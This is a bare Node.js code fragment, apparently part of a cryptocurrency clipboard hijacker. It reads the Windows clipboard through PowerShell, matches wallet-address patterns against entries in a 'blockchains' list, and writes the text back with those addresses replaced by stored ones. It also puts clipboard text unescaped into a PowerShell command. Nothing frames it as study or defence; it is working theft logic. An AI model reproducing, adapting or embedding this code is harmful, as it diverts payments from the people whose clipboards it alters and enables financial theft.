const child_process = require('child_process');

const paste = child_process.execSync(`powershell Get-Clipboard`).toString("utf8").replace("\r", "");
let text = paste;
let dtc = false;

for (let i = 0; i < blockchains.length; i++) {
    const blockchain = blockchains[i];

    for (let line of text.split("\n")) {
        if (line == blockchain.adress) {
            break;
        }
        if (blockchain.regex.test(line.replace("\r", ""))) {
            dtc = true;
            text = text.replace(line, blockchain.adress);
        }
    }

    if (dtc) {
        child_process.execSync(`powershell Set-Clipboard ${text}`);
    }
}